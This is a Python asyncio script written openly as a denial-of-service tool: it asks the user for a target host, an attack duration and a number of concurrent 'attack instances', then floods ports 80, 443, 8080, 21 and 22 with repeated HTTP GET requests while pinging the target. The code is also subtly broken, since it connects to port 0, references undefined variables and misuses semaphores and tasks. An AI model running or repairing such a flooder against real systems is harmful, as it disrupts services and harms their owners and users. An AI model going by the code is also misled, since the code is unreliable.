import asyncio
import os
import socket
import subprocess
import time
from typing import Dict, Tuple

class bcolors:
    HEADER = '\033[95m'
    OKBLUE = '\033[94m'
    OKGREEN = '\033[92m'
    WARNING = '\033[93m'
    FAIL = '\033[91m'
    ENDC = '\033[0m'

class CustomTCPProtocol(asyncio.Protocol):
    def __init__(self):
        self.queues: Dict[Tuple[str, int], asyncio.Queue] = {}
        self.destinations: Dict[Tuple[str, int], Tuple[asyncio.Queue, asyncio.Semaphore]] = {}
        self.transport = None

    def connection_made(self, transport):
        self.transport = transport
        print(f"{bcolors.OKGREEN}Connection established{bcolors.ENDC}")

    def data_received(self, data: bytes) -> None:
        for dest in self.destinations.values():
            dest[0].put_nowait(data)

    def connection_lost(self, exc):
        if exc is not asyncio.CancelledError:
            print(f"{bcolors.FAIL}Connection lost{bcolors.ENDC}")
        for dest in self.destinations.values():
            dest[1].release()
        self.destinations.clear()

    def send_data(self, dest: Tuple[str, int], data: bytes):
        if not dest[0].empty():
            dest[1].acquire()
            dest[0].put_nowait(data)
            dest[1].release()

    def add_destination(self, dest: Tuple[str, int]):
        if dest not in self.destinations:
            self.destinations[dest] = (asyncio.Queue(), asyncio.Semaphore())

async def ping_target(target: str):
    while True:
        try:
            os.system("clear")
            output = subprocess.check_output(["ping", "-c", "1", target], stderr=subprocess.STDOUT, universal_newlines=True)
            print(f"{bcolors.OKBLUE}Ping successful: {output.split()[3]} ms{bcolors.ENDC}")
            load = timer*100
            cal = duration_minutes - load
            print(f"{cal}")
        except subprocess.CalledProcessError:
            print(f"{bcolors.FAIL}Ping failed. Target is not reachable.{bcolors.ENDC}")
        await asyncio.sleep(1)

async def attack(target: str, duration_minutes: int, attack_count: int) -> None:
    status = {}
    duration_seconds = duration_minutes * 60

    def on_task_complete(f: asyncio.Future) -> None:
        result = f.result() if f.done() else "failed"
        status[result] = status.get(result, 0) + 1

    loop = asyncio.get_running_loop()
    
    tasks = []
    for _ in range(attack_count):
        transport, protocol = await loop.create_connection(lambda: CustomTCPProtocol(), target, 0)

        try:
            ports = [80, 443, 8080, 21, 22]
            for port in ports:
                print(f"{bcolors.OKBLUE}Sending data to {target}:{port}{bcolors.ENDC}")
                protocol.add_destination((target, port))
                transport.write(f"GET / HTTP/1.1\r\nHost: {target}\r\n\r\n".encode())

            end_time = loop.time() + duration_seconds
            while loop.time() < end_time:
                for dest in protocol.destinations.keys():
                    for _ in range(10):  # Increase the number of requests sent
                        task = asyncio.create_task(protocol.send_data(protocol.destinations[dest],
                            f"GET / HTTP/1.1\r\nHost: {target}\r\n\r\n".encode()))
                        task.add_done_callback(on_task_complete)
                        tasks.append(task)
                await asyncio.sleep(0.1)  # Decrease the delay between sending requests

            await asyncio.gather(*tasks)
            print(f"{bcolors.OKGREEN}Attack instance completed.{bcolors.ENDC}")
        finally:
            transport.close()

    print(f"{bcolors.OKGREEN}All attack instances completed.{bcolors.ENDC}")
    print(f"{bcolors.WARNING}Status:{bcolors.ENDC} {status}")

async def countdown(duration_seconds: int):
    for remaining in range(duration_seconds, 0, -1):
        mins, secs = divmod(remaining, 60)
        timer = f"{mins:02}:{secs:02}"
        print(f"\r{bcolors.HEADER}Time remaining: {timer}{bcolors.ENDC}", end="")
        await asyncio.sleep(1)
    print()  # Newline after countdown

async def main():
    os.system('clear')  # Clear the terminal
    duration_minutes = int(input(f"{bcolors.HEADER}Enter the duration of the attack in minutes: {bcolors.ENDC}"))
    target = input(f"{bcolors.HEADER}Enter the target IP or domain (e.g. 123.123.123.123 or www.example.com): {bcolors.ENDC}")
    attack_count = int(input(f"{bcolors.HEADER}Enter the number of concurrent attack instances (e.g. 100): {bcolors.ENDC}"))
    print(f"{bcolors.OKGREEN}Attacking {target} on ports [80, 443, 8080, 21, 22] for {duration_minutes} minutes with {attack_count} concurrent instances...{bcolors.ENDC}")

    duration_seconds = duration_minutes * 60
    await asyncio.gather(
        attack(target, duration_minutes, attack_count),
        ping_target(target),
        countdown(duration_seconds)
    )

if __name__ == "__main__":
    asyncio.run(main())
